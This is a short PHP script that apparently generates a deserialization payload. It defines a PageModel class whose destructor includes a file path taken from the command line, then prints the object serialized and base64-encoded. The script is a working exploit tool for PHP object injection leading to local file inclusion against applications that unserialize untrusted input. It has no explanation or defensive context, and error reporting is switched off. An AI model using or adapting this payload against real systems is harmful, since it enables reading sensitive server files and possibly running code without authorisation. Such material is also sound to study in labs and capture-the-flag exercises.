<?php
error_reporting(0);
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
$page=new PageModel;
$page->file=getopt("f:")['f'];
print(base64_encode(serialize($page)));
?>
